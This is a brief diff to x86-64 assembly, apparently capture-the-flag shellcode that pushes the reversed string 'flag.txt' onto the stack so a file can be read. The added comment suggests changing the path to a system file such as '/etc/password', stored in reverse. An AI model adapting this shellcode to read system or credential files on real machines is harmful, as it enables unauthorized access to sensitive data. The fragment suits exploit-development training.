@@ -4,7 +4,7 @@ _start:
 
 xor     rax, rax
 push    rax
-mov     rax, 0x7478742E67616C66 ;txt.galf
+mov     rax, 0x7478742E67616C66 ;txt.galf <--- modify this line to get something like /etc/password, don't fortget to do it in reverse!
 push    rax
 mov     rcx, rsp
 xor     rax, rax
